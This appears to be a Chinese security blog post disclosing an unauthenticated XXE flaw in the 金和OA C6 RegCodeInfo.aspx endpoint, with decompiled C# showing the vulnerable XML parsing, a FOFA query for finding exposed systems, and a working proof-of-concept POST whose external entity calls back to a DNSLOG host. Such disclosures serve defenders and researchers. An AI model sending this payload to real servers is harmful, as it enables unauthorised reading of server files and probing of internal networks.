---
title: "金和OA RegCodeInfo.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-RegCodeInfo-xxe.html
asset_dir: assets/金和oa-regcodeinfo.aspx-xxe漏洞
---

# 金和OA RegCodeInfo.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/19 13:31
- 233浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

恶意软件分析工具

漏洞预警服务

SQL注入防护

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `RegCodeInfo.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `RegCodeInfo.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Dossier.dll` 将其进行反编译后找到 **RegCodeInfo** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.InitText();
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  try
  {
    this.Request.QueryString.ToString();
    string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

深入探索

Nessus

计算机安全

安全运维咨询

# 漏洞复现

```
POST /c6/Jhsoft.Web.dossier/RegCodeInfo.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA RegCodeInfo.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
